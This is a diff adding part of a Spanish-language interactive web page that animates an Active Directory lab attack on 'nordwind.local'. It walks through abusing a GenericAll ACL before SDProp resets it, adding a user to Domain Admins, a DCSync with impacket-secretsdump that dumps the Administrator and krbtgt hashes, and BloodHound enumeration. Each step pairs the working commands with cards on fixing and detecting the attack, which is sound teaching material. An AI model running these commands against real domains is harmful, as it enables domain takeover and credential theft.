+    {t:'wire', title:'MS-SAMR · Kali → DC01 · autenticado como robert', parts:[['SamrAddMemberToGroup','pide meter a robert en Domain Admins'],['← ACCESS_DENIED','el DC rechaza: robert ya no tiene el permiso','bad']], note:'La petición está bien formada; lo que ha cambiado es la ACL del grupo, que SDProp acaba de restaurar. El rechazo lo da el propio DC, no la red.'},
+    {t:'pkt', from:'kali', to:'dc', label:'SAMR: añadir miembro', cls:'hit'},
+    {t:'wait', ms:300},
+    {t:'pkt', from:'dc', to:'kali', label:'ACCESS_DENIED', cls:'deny'},
+    {t:'out', lines:[['err','NT_STATUS_ACCESS_DENIED']]},
+    {t:'set', f:G=>{G.rm('da','target');G.add('da','shield');G.sub('da','protegido por SDProp');G.edge('ga','robert','da','GenericAll ✕','dead');G.sdprop('SDProp · restaura la ACL cada ~60 min');}},
+    {t:'cm', s:'# El comando está bien. Lo que ha cambiado es la ACL del grupo.'},
+    {t:'cm', s:'# AdminSDHolder / SDProp la restauró: el GenericAll de robert ya no existe.'}
+  ]
+},
+{
+  chip:'Carrera', title:'Ganar la carrera a SDProp: robert entra en Domain Admins', need:'Como robert, dentro de la ventana',
+  sum:'Entre una pasada de SDProp y la siguiente hay hasta 60 minutos en los que una ACL plantada sigue viva. Vuelvo a plantarla en el DC y lanzo el comando de inmediato.',
+  cards:[
+    ['Por qué funciona','`GenericAll` sobre un grupo incluye escribir su lista de miembros. SDProp limpia, pero solo cada hora: mientras tanto el permiso funciona. Nota honesta: volver a plantar la ACL lo hago yo como administrador del lab; un atacante real tendría que encontrar ese permiso ya existente o buscar otra ruta.'],
+    ['Cómo se arregla','Modelo de administración por niveles: ninguna cuenta normal con derechos sobre grupos privilegiados. Auditar `GenericAll`, `WriteDacl` y `WriteOwner` sobre objetos sensibles. Y no contar con SDProp como control: una hora es tiempo de sobra.'],
+    ['Cómo se detecta','Event ID `4728` (miembro añadido a un grupo global de seguridad) sobre Domain Admins. Es de las alertas más importantes de un dominio y debería avisar a una persona en el momento, no quedarse en un informe semanal.']
+  ],
+  script:[
+    {t:'cm', s:'# En el DC, como administrador del lab: re-planto la mala configuración.'},
+    {t:'cmd', host:'dc', s:'$da = (Get-ADGroup "Domain Admins").DistinguishedName'},
+    {t:'cmd', host:'dc', s:'dsacls "$da" /G "NORDWIND\\robert.dabrowski:GA"'},
+    {t:'out', lines:['The command completed successfully']},
+    {t:'set', f:G=>{G.edge('ga','robert','da','GenericAll','');G.sdprop('SDProp · próxima pasada en < 60 min');G.rm('da','shield');G.add('da','target');G.sub('da','ACL modificada');}},
+    {t:'cm', s:'# En Kali, inmediatamente:'},
+    {t:'cmd', s:"net rpc group addmem \"Domain Admins\" robert.dabrowski -U 'nordwind.local/robert.dabrowski%NewPass123!' -S 192.168.10.10"},
+    {t:'wire', title:'MS-SAMR · Kali → DC01 · robert, con la ventana abierta', parts:[['SamrAddMemberToGroup','mete a robert en Domain Admins'],['← OK','ahora sí: la ACL re-plantada sigue viva','warn']], note:'Exactamente la misma petición que en el paso anterior. La única diferencia es el tiempo: el permiso lleva vivo menos de una hora y SDProp todavía no lo ha borrado.'},
+    {t:'pkt', from:'kali', to:'dc', label:'SAMR: añadir miembro', cls:'hit'},
+    {t:'beam', from:'robert', to:'da', color:'var(--red)'},
+    {t:'cmd', s:"netexec smb 192.168.10.10 -u robert.dabrowski -p 'NewPass123!'"},
+    {t:'out', lines:[['pw','SMB  192.168.10.10  445  DC01  [+] nordwind.local\\robert.dabrowski:NewPass123! (Pwn3d!)']]},
+    {t:'set', f:G=>{G.edge('ga','robert','da','MemberOf','red');G.rm('da','target');G.add('da','owned');G.sub('da','+ robert');G.add('robert','crown');G.sub('robert','Domain Admin');G.loot('Domain Admin');G.sdprop('');}}
+  ]
+},
+{
+  chip:'DCSync', title:'DCSync: todos los secretos del dominio', need:'Como Domain Admin',
+  sum:'Con privilegios de Domain Admin, Kali le pide al DC que le replique el directorio como si fuera otro controlador de dominio. El DC entrega los hashes de todas las cuentas, incluidos krbtgt y Administrator.',
+  cards:[
+    ['Por qué funciona','Los DC se sincronizan entre sí mediante el protocolo de replicación (DRSUAPI). Quien tenga los derechos Replicating Directory Changes y Replicating Directory Changes All puede pedir los secretos de cualquier cuenta. Domain Admins los tiene. No hace falta tocar LSASS ni dejar binarios en disco.'],
+    ['Cómo se arregla','Reducir al mínimo quién es Domain Admin y auditar quién tiene derechos de replicación en la raíz del dominio. Tras un compromiso así, hay que cambiar la contraseña de krbtgt dos veces para invalidar cualquier Golden Ticket.'],
+    ['Cómo se detecta','Event ID `4662` con los GUID de replicación `1131f6aa-…` y `1131f6ad-…` ejecutado por una cuenta que no es un DC. En red: tráfico DRSUAPI hacia el DC desde una IP que no es otro controlador de dominio.']
+  ],
+  script:[
+    {t:'cmd', s:"impacket-secretsdump nordwind.local/robert.dabrowski:'NewPass123!'@192.168.10.10 -just-dc"},
+    {t:'wire', title:'DRSUAPI · Kali se hace pasar por un DC', parts:[['DRSBind','abre la sesión de replicación'],['DRSGetNCChanges','"replícame los secretos de estas cuentas"','bad']], note:'Es la misma llamada que usan dos DC legítimos para sincronizarse. La diferencia es quién la hace.'},
+    {t:'pkt', from:'kali', to:'dc', label:'DRSGetNCChanges', cls:'hit'},
+    {t:'out', lines:['[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)','[*] Using the DRSUAPI method to get NTDS.DIT secrets']},
+    {t:'set', f:G=>{G.add('admin','target');G.add('krbtgt','target');}},
+    {t:'beam', from:'dc', to:'admin', color:'var(--red)'},
+    {t:'pkt', from:'dc', to:'kali', label:'Administrator · hash NT', cls:'hit'},
+    {t:'out', lines:[['pw','Administrator:500:aad3b435b51404eeaad3b435b51404ee:'+HID+':::']]},
+    {t:'set', f:G=>{G.rm('admin','target');G.add('admin','owned');G.sub('admin','→ Pass-the-Hash');G.loot('Administrator');}},
+    {t:'beam', from:'dc', to:'krbtgt', color:'var(--red)'},
+    {t:'pkt', from:'dc', to:'kali', label:'krbtgt · hash NT', cls:'hit'},
+    {t:'out', lines:[['pw','krbtgt:502:aad3b435b51404eeaad3b435b51404ee:'+HID+':::'],['dim','… y el resto de cuentas del dominio']]},
+    {t:'set', f:G=>{G.rm('krbtgt','target');G.add('krbtgt','owned');G.sub('krbtgt','→ Golden Ticket');G.loot('krbtgt');}},
+    {t:'wait', ms:500},
+    {t:'set', f:G=>G.pwned()},
+    {t:'cm', s:'# Administrator → Pass-the-Hash contra cualquier máquina.'},
+    {t:'cm', s:'# krbtgt → Golden Ticket: persistencia total en el dominio.'}
+  ]
+},
+{
+  chip:'BloodHound', title:'Epílogo: BloodHound y el error que cometí', need:'Como piotr',
+  sum:'Con el dominio ya comprometido recogí el grafo con BloodHound usando la cuenta de piotr. La ruta de piotr a Domain Admins no aparecía. Tardé en entender por qué.',
+  cards:[
+    ['Qué pasó','Al entrar robert en Domain Admins pasó a ser una cuenta protegida (`adminCount=1`), así que SDProp reescribió también su ACL y eliminó el permiso que piotr tenía sobre él. Recogí los datos después de explotar: la foto se tomó cuando la ruta ya no existía.'],
+    ['La lección','BloodHound es una foto de un instante. Primero se recoge, con el dominio en su estado vulnerable, y después se explota. Y al revés: una ruta dibujada puede estar ya muerta cuando vas a usarla.'],
+    ['Cómo se detecta','Una sola cuenta sin privilegios leyendo el directorio entero por LDAP en segundos. Se detecta por volumen de consultas (Event ID `1644` si se activa el registro de consultas LDAP costosas) o con cuentas señuelo que nadie debería consultar.']
+  ],
+  script:[
+    {t:'cmd', s:"bloodhound-python -u piotr.wisniewski -p 'Autumn2024!' -d nordwind.local -ns 192.168.10.10 -c All --zip"},
+    {t:'wire', title:'LDAP · Kali → DC01 · autenticado como piotr', parts:[['búsquedas masivas','usuarios, grupos, equipos y todas sus ACL'],['respuesta completa','lectura que cualquier cuenta del dominio puede hacer','warn']], note:'No se explota nada: es la lectura del directorio que AD ofrece por diseño a cualquier usuario autenticado. BloodHound solo ordena esa información en un grafo de rutas.'},
+    {t:'pkt', from:'kali', to:'dc', label:'LDAP: todo el directorio', cls:'req'},
+    {t:'pkt', from:'dc', to:'kali', label:'usuarios · grupos · ACL', cls:'no'},
+    {t:'out', lines:['INFO: Found 1 domains',['dim','… usuarios, grupos, equipos y ACL enumerados'],'INFO: Compressing output into zip']},
+    {t:'cm', s:'# Un usuario sin privilegios puede leer todo el directorio: LDAP es legible por diseño.'},
+    {t:'cm', s:'# "Shortest Paths to Domain Admins" → piotr no aparece. Consulto el grafo directamente:'},
+    {t:'cmd', host:'bh', s:"MATCH (u:User)-[r]->(n) WHERE toLower(u.name) CONTAINS 'piotr' RETURN u, r, n"},
+    {t:'out', lines:[['hl','PIOTR.WISNIEWSKI ──MemberOf──▶ DOMAIN USERS'],['dim','(ninguna otra relación)']]},
+    {t:'set', f:G=>{G.edge('fcp','piotr','robert','ForceChangePassword ✕','dead');G.sub('robert','Domain Admin · adminCount=1');G.sdprop('SDProp también limpió la ACL de robert');}},
+    {t:'cm', s:'# SDProp borró el ForceChangePassword al proteger a robert. Recogí después del crimen.'},
+    {t:'cm', s:'# Fin: de cero credenciales a krbtgt. Writeup completo en el repositorio.'}
+  ]
+}
+];
+
+/* ============================================================
+   GRAFO (SVG)
+   ============================================================ */
+function build(){
+  const grid=el('g',{class:'grid'});
+  for(let x=-40;x<820;x+=40)el('line',{x1:x,y1:0,x2:x,y2:590},grid);
+  for(let y=40;y<590;y+=40)el('line',{x1:-75,y1:y,x2:820,y2:y},grid);
+  const bd=el('rect',{class:'boundary',x:165,y:28,width:635,height:548,rx:16}); clickable(bd,'dom','Dominio nordwind.local');
+  el('text',{class:'blabel',x:182,y:52},svg,'NORDWIND.LOCAL');
+  el('line',{class:'net',x1:73,y1:100,x2:452,y2:100});
+  el('line',{class:'net',x1:508,y1:100,x2:692,y2:100});
+  for(const o of OUS){const r=el('rect',{class:'ou',x:o.x,y:o.y,width:o.w,height:o.h,rx:10});clickable(r,o.k,o.label);el('text',{class:'oulabel',x:o.x+9,y:o.y+15},svg,o.label);}
+  const rr=el('rect',{class:'ou',x:200,y:512,width:580,height:50,rx:10});clickable(rr,'others','Resto de empleados');
+  el('text',{class:'oulabel',x:212,y:541},svg,'Resto de empleados (8)');
+  L.others=el('g',{});
+  OTHERS.forEach((n,i)=>{const c=el('circle',{class:'o',cx:410+i*47,cy:537,r:8},L.others);el('title',{},c,n);clickable(c,'others',n);});
+  L.edges=el('g',{}); L.beams=el('g',{});
+  L.sd=el('g',{id:'sdprop'});
+  el('circle',{class:'ring',cx:452,cy:336,r:7},L.sd);
+  L.sdt=el('text',{x:465,y:340},L.sd,'');
+  L.nodes={};
+  for(const id in NODES){
+    const n=NODES[id], g=el('g',{class:'n '+(n.kind==='atk'?'atk':''),transform:`translate(${n.x},${n.y})`});
+    if(n.kind==='pc'||n.kind==='atk')el('rect',{class:'shape',x:-27,y:-24,width:54,height:48,rx:9},g);
+    else if(n.kind==='group')el('rect',{class:'shape',x:-26,y:-26,width:52,height:52,rx:16},g);
+    else el('circle',{class:'shape',r:25},g);
+    if(n.kind==='atk')el('text',{class:'glyph',y:5},g,'>_');
+    else el('path',{class:'ico',d:ICONS[n.kind]},g);
+    el('text',{class:'lb',y:42},g,n.label);
+    const sb=el('text',{class:'sb',y:55},g,n.sub);
+    if(INFO[id])clickable(g,id,n.label);
+    L.nodes[id]={g,sb};
+  }
+  L.logh=el('text',{class:'logh',x:45,y:182},svg,'');L.log=el('g',{});L.pk=el('g',{});
+  const b=el('g',{id:'banner'});
+  el('rect',{x:352,y:38,width:436,height:24,rx:6},b);
+  el('text',{x:570,y:54},b,'DOMINIO COMPROMETIDO · 0 CREDENCIALES → KRBTGT');
+}
+const G={
+  add(id,c){L.nodes[id].g.classList.add(c);},
+  rm(id,c){L.nodes[id].g.classList.remove(c);},
+  sub(id,t){L.nodes[id].sb.textContent=t;},
+  others(c){for(const o of L.others.children)o.setAttribute('class','o '+c);},
+  loot(t){const box=$('loot');if(box.firstElementChild&&box.firstElementChild.tagName==='EM')box.textContent='';const s=document.createElement('span');s.textContent=t;box.appendChild(s);},
+  pwned(){svg.classList.add('pwned');},
+  sdprop(t){L.sd.classList.toggle('on',!!t);if(t)L.sdt.textContent=t;},
+  edge(id,a,b,label,cls){
+    let g=L.edges.querySelector('[data-id="'+id+'"]'); if(g)g.remove();
+    g=el('g',{class:'e '+cls,'data-id':id},L.edges);
+    const A=NODES[a],B=NODES[b],dx=B.x-A.x,dy=B.y-A.y,d=Math.hypot(dx,dy),ux=dx/d,uy=dy/d;
+    const x1=A.x+ux*30,y1=A.y+uy*30,x2=B.x-ux*36,y2=B.y-uy*36;
+    el('line',{x1,y1:y1+(uy>0?28:0),x2,y2},g);
+    const px=-uy,py=ux,tx=B.x-ux*29,ty=B.y-uy*29;
+    el('polygon',{points:`${tx},${ty} ${x2+px*5},${y2+py*5} ${x2-px*5},${y2-py*5}`},g);
+    const mx=(A.x+B.x)/2,my=(A.y+B.y)/2;
+    if(Math.abs(dx)<Math.abs(dy))el('text',{x:mx+9,y:my+7},g,label);
+    else el('text',{x:mx,y:my-9,'text-anchor':'middle'},g,label);
+  }
+};
+function resetGraph(){
+  for(const id in NODES){L.nodes[id].g.setAttribute('class','n '+(NODES[id].kind==='atk'?'atk':'')+(INFO[id]?' click':''));L.nodes[id].sb.textContent=NODES[id].sub;}
+  L.edges.textContent='';L.beams.textContent='';L.pk.textContent='';L.log.textContent='';L.logh.textContent='';
+  G.others('');G.sdprop('');svg.classList.remove('pwned');
+  $('loot').innerHTML='<em>nada todavía</em>';
+}
+
+/* ============================================================
+   LO PROPIO DE ESTA PÁGINA: consolas, paquetes y haces
+   (el motor de reproducción está en assets/engine.js)
+   ============================================================ */
+const PROMPT={kali:['kali@kali:~/nordwind$ ',''],dc:['PS C:\\> ','dc'],bh:['cypher> ','bh']};
+const TITLE={kali:'kali — ~/nordwind',dc:'DC01 — PowerShell (admin)',bh:'BloodHound CE — Cypher'};
+function chip(a,parent){
+  const sent=a.from==='kali', txt=(sent?'→ ':'← ')+a.label, w=txt.length*7+18;
+  const g=el('g',{class:'pk '+a.cls},parent);
+  el('rect',{x:-w/2,y:-11,width:w,height:22,rx:6},g);el('text',{},g,txt);
+  return {g,w};
+}
+function slot(){const n=L.log.childElementCount;L.logh.textContent='MENSAJES DE ESTE PASO';return {x:45,y:202+n*27};}
+async function doPkt(a,my){
+  const s=slot(), sent=a.from==='kali';
+  if(instant||reduce){chip(a,L.log).g.setAttribute('transform',`translate(${s.x},${s.y})`);return;}
+  const A=NODES[a.from],B=NODES[a.to];
+  if(sent){
+    // lo que envía Kali: queda anotado bajo Kali y una copia viaja al destino
+    chip(a,L.log).g.setAttribute('transform',`translate(${s.x},${s.y})`);
+    const c=chip(a,L.pk), x0=A.x+30+c.w/2, x1=B.x-30-c.w/2;
+    await tween(c.g,x0,A.y-20,x1,B.y-20,1700,my);
+    await wait(500,my); c.g.remove();
+  }else{
+    // lo que recibe Kali: llega y baja a apilarse bajo Kali
+    const c=chip(a,L.pk), x0=A.x-30-c.w/2, x1=Math.max(B.x+30+c.w/2,s.x);
+    await tween(c.g,x0,A.y-20,x1,B.y-20,1700,my);
+    await wait(350,my);
+    await tween(c.g,x1,B.y-20,s.x,s.y,600,my);
+    L.log.appendChild(c.g);
+  }
+  await wait(300,my);
+}
+async function doBeam(a,my){
+  if(instant||reduce)return;
+  const A=NODES[a.from],B=NODES[a.to];
+  const l=el('line',{class:'beam',x1:A.x,y1:A.y+26,x2:B.x,y2:B.y-28,stroke:a.color},L.beams);
+  setTimeout(()=>l.remove(),1700); await wait(500,my);
+}
+function idleWire(){$('wire').innerHTML='<div class="wire-n idle">Cuando un paso use Kerberos o replicación, aquí se desglosa cada mensaje: qué lleva y con la clave de quién va cifrado. En este paso no hay ninguno.</div>';}
+
+start('kali');
+</script>
+</body>
+</html>
